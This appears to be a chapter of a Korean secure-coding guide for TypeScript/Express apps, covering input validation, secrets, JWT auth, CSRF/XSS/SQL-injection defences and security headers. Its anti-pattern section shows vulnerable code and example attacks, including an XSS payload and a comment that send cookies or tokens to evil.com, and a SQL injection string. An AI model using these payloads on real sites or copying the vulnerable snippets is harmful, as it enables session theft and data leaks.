# ch02 — 보안

> 키워드: `auth`, `token`, `XSS`, `CSRF`, `encryption`, `secrets`

---

## Rules (MUST)

### R1. 모든 사용자 입력을 검증하고 이스케이프한다
클라이언트에서 전달되는 모든 데이터는 신뢰하지 않는다. 서버 측에서 반드시 타입, 길이, 형식, 범위를 검증하고, 출력 시 컨텍스트에 맞게 이스케이프한다.

### R2. 시크릿을 절대 코드에 하드코딩하지 않는다
API 키, DB 비밀번호, JWT 시크릿 등 모든 민감 정보는 환경 변수 또는 시크릿 매니저(Vault, AWS Secrets Manager 등)를 통해 관리한다. `.env` 파일은 반드시 `.gitignore`에 포함한다.

### R3. 인증(Authentication)과 인가(Authorization)를 분리한다
인증은 "누구인가", 인가는 "무엇을 할 수 있는가"이다. 모든 보호된 엔드포인트에 두 단계 모두 적용한다. 인가 로직은 미들웨어에서 일관되게 처리한다.

### R4. CSRF 보호를 적용한다
상태 변경 요청(POST, PUT, DELETE)에 CSRF 토큰을 사용한다. SameSite 쿠키 속성을 `Strict` 또는 `Lax`로 설정한다.

### R5. XSS를 방지한다
사용자 입력을 HTML에 렌더링할 때 반드시 이스케이프한다. CSP(Content Security Policy) 헤더를 설정하여 인라인 스크립트 실행을 차단한다. `innerHTML` 사용을 금지한다.

### R6. SQL 인젝션을 방지한다
쿼리 작성 시 반드시 파라미터화된 쿼리(Parameterized Query) 또는 ORM을 사용한다. 문자열 연결(concatenation)로 SQL을 만들지 않는다.

### R7. 보안 HTTP 헤더를 설정한다
`Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, `Referrer-Policy` 등 보안 헤더를 모든 응답에 포함한다.

### R8. 최소 권한 원칙을 적용한다
서비스 계정, DB 사용자, API 토큰 등 모든 자격 증명에 필요한 최소한의 권한만 부여한다. 관리자 권한의 범용 사용을 금지한다.

### R9. 의존성 보안 취약점을 정기적으로 스캔한다
`npm audit`, Snyk, Dependabot 등을 CI 파이프라인에 통합하여 알려진 취약점을 자동 탐지한다. 심각도 높은 취약점은 즉시 패치한다.

### R10. 세션/토큰을 안전하게 관리한다
JWT는 `httpOnly`, `secure`, `sameSite` 쿠키로 저장한다. 토큰 만료 시간을 적절히 설정하고, 리프레시 토큰 로테이션을 구현한다. 로그아웃 시 토큰을 무효화한다.

---

## Patterns (권장 패턴)

### 패턴 1: 입력 검증 미들웨어 (Zod 활용)

```typescript
import { z } from 'zod';
import { Request, Response, NextFunction } from 'express';

// 스키마 정의
const CreateUserSchema = z.object({
  email: z.string().email('유효한 이메일 형식이 아닙니다'),
  name: z.string().min(2, '이름은 2자 이상이어야 합니다').max(50),
  password: z
    .string()
    .min(8, '비밀번호는 8자 이상이어야 합니다')
    .regex(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/,
      '대소문자, 숫자, 특수문자를 포함해야 합니다'),
  role: z.enum(['user', 'editor']).default('user'),
});

// 검증 미들웨어 팩토리
function validate<T>(schema: z.ZodSchema<T>) {
  return (req: Request, res: Response, next: NextFunction) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      const errors = result.error.issues.map((issue) => ({
        field: issue.path.join('.'),
        message: issue.message,
      }));
      return res.status(400).json({
        success: false,
        error: { code: 'VALIDATION_ERROR', details: errors },
      });
    }
    req.body = result.data; // 검증 + 정제된 데이터로 교체
    next();
  };
}

// 라우터에서 사용
router.post('/users', validate(CreateUserSchema), userController.create);
```

### 패턴 2: 시크릿 관리

```typescript
// config/secrets.ts
interface AppSecrets {
  jwtSecret: string;
  dbPassword: string;
  apiKey: string;
}

function loadSecrets(): AppSecrets {
  const required = ['JWT_SECRET', 'DB_PASSWORD', 'API_KEY'] as const;
  const missing = required.filter((key) => !process.env[key]);

  if (missing.length > 0) {
    throw new Error(
      `필수 환경 변수가 설정되지 않았습니다: ${missing.join(', ')}`
    );
  }

  return {
    jwtSecret: process.env.JWT_SECRET!,
    dbPassword: process.env.DB_PASSWORD!,
    apiKey: process.env.API_KEY!,
  };
}

// 앱 시작 시 한 번만 로드
export const secrets = loadSecrets();

// .gitignore에 반드시 포함
// .env
// .env.local
// .env.*.local
```

### 패턴 3: JWT 인증 + 인가 미들웨어

```typescript
import jwt from 'jsonwebtoken';

interface TokenPayload {
  userId: string;
  role: 'user' | 'editor' | 'admin';
  iat: number;
  exp: number;
}

// 인증 미들웨어
function authenticate(req: Request, res: Response, next: NextFunction): void {
  const token = req.cookies['access_token']; // httpOnly 쿠키에서 추출

  if (!token) {
    res.status(401).json({ error: { code: 'UNAUTHORIZED', message: '인증이 필요합니다' } });
    return;
  }

  try {
    const payload = jwt.verify(token, secrets.jwtSecret) as TokenPayload;
    req.user = payload;
    next();
  } catch (error) {
    if (error instanceof jwt.TokenExpiredError) {
      res.status(401).json({ error: { code: 'TOKEN_EXPIRED', message: '토큰이 만료되었습니다' } });
      return;
    }
    res.status(401).json({ error: { code: 'INVALID_TOKEN', message: '유효하지 않은 토큰입니다' } });
  }
}

// 인가 미들웨어 (역할 기반)
function authorize(...allowedRoles: string[]) {
  return (req: Request, res: Response, next: NextFunction): void => {
    if (!req.user || !allowedRoles.includes(req.user.role)) {
      res.status(403).json({
        error: { code: 'FORBIDDEN', message: '이 작업을 수행할 권한이 없습니다' },
      });
      return;
    }
    next();
  };
}

// 토큰 발급 시 httpOnly + secure 쿠키로 설정
function setAuthCookies(res: Response, accessToken: string, refreshToken: string): void {
  res.cookie('access_token', accessToken, {
    httpOnly: true,
    secure: true,        // HTTPS에서만 전송
    sameSite: 'strict',  // CSRF 방지
    maxAge: 15 * 60 * 1000, // 15분
  });

  res.cookie('refresh_token', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/api/auth/refresh', // 리프레시 엔드포인트에서만 전송
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7일
  });
}

// 라우터에서 사용
router.get('/admin/users', authenticate, authorize('admin'), adminController.listUsers);
router.put('/posts/:id', authenticate, authorize('editor', 'admin'), postController.update);
```

### 패턴 4: 보안 헤더 설정 (Helmet 활용)

```typescript
import helmet from 'helmet';

app.use(helmet());

// CSP 세부 설정
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"], // 인라인 스크립트 차단
      styleSrc: ["'self'", "'unsafe-inline'"], // 필요시만 인라인 스타일 허용
      imgSrc: ["'self'", 'data:', 'https://cdn.example.com'],
      connectSrc: ["'self'", 'https://api.example.com'],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  })
);

// HSTS 설정
app.use(
  helmet.strictTransportSecurity({
    maxAge: 63072000, // 2년
    includeSubDomains: true,
    preload: true,
  })
);
```

### 패턴 5: SQL 인젝션 방지 (파라미터화 쿼리)

```typescript
// ORM 사용 (Prisma 예시)
const user = await prisma.user.findUnique({
  where: { email: sanitizedEmail }, // ORM이 자동으로 파라미터화
});

// Raw 쿼리가 필요한 경우에도 파라미터화
const results = await prisma.$queryRaw`
  SELECT * FROM users
  WHERE email = ${email}
  AND status = ${status}
`;
// Prisma의 tagged template literal은 자동으로 파라미터화됨
```

---

## Anti-Patterns (NEVER)

### 안티패턴 1: 시크릿 하드코딩

```typescript
// NEVER: 코드에 시크릿을 직접 작성
const jwtSecret = 'my-super-secret-key-12345';
const dbUrl = 'postgresql://admin:password123@prod-db:5432/myapp';
const apiKey = 'sk-1234567890abcdef';

// NEVER: 커밋 히스토리에 시크릿이 남음
// 한번 커밋되면 git history에서 완전히 제거하기 어렵다
```

### 안티패턴 2: SQL 문자열 연결

```typescript
// NEVER: SQL 인젝션에 완전히 취약
const query = `SELECT * FROM users WHERE email = '${userInput}'`;
const result = await db.query(query);

// 공격자 입력: ' OR '1'='1' --
// 결과 쿼리: SELECT * FROM users WHERE email = '' OR '1'='1' --'
// => 전체 사용자 데이터 유출
```

### 안티패턴 3: innerHTML로 사용자 입력 렌더링

```typescript
// NEVER: XSS 공격에 완전히 취약
element.innerHTML = userComment;

// 공격자 입력: <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
// => 다른 사용자의 쿠키 탈취
```

### 안티패턴 4: 클라이언트 측에만 의존하는 검증

```typescript
// NEVER: 클라이언트 검증만으로 보안을 보장할 수 없다
// 프론트엔드
if (role === 'admin') {
  showAdminPanel(); // 클라이언트에서 UI만 숨기면 안전하다고 생각하는 것은 위험
}

// 서버에서 인가 검사를 하지 않으면, API를 직접 호출하여 우회 가능
// curl -X DELETE https://api.example.com/users/123 -H "Authorization: Bearer user-token"
```

### 안티패턴 5: 토큰을 localStorage에 저장

```typescript
// NEVER: XSS 공격 시 토큰 탈취 가능
localStorage.setItem('accessToken', token);

// XSS가 발생하면 공격자가 다음과 같이 탈취 가능:
// fetch('https://evil.com/steal?token=' + localStorage.getItem('accessToken'))
```

### 안티패턴 6: 에러 메시지로 시스템 정보 노출

```typescript
// NEVER: 공격자에게 시스템 정보를 제공
app.post('/login', async (req, res) => {
  const user = await db.users.findByEmail(req.body.email);
  if (!user) {
    return res.status(401).json({ message: '해당 이메일의 사용자가 존재하지 않습니다' });
    // 공격자가 유효한 이메일을 열거(enumeration)할 수 있음
  }
  if (!verifyPassword(req.body.password, user.passwordHash)) {
    return res.status(401).json({ message: '비밀번호가 올바르지 않습니다' });
  }
});

// 올바른 방법: 이메일/비밀번호 오류를 구분하지 않는 통합 메시지 사용
// "이메일 또는 비밀번호가 올바르지 않습니다"
```

---

## Checklist

코드 리뷰 또는 PR 작성 시 아래 항목을 확인합니다:

- [ ] 모든 사용자 입력이 서버 측에서 검증되는가? (타입, 길이, 형식, 범위)
- [ ] 시크릿이 코드나 설정 파일에 하드코딩되어 있지 않은가? (`.env`는 `.gitignore`에 포함)
- [ ] 보호된 엔드포인트에 인증 + 인가 미들웨어가 모두 적용되어 있는가?
- [ ] SQL 쿼리가 파라미터화되어 있는가? (문자열 연결 사용 없음)
- [ ] CSP, HSTS 등 보안 헤더가 설정되어 있는가?
- [ ] JWT가 `httpOnly`, `secure`, `sameSite` 쿠키로 저장되는가?
- [ ] `npm audit` 또는 동등한 보안 스캔이 CI에 포함되어 있는가?
- [ ] 에러 메시지가 시스템 내부 정보를 노출하지 않는가?
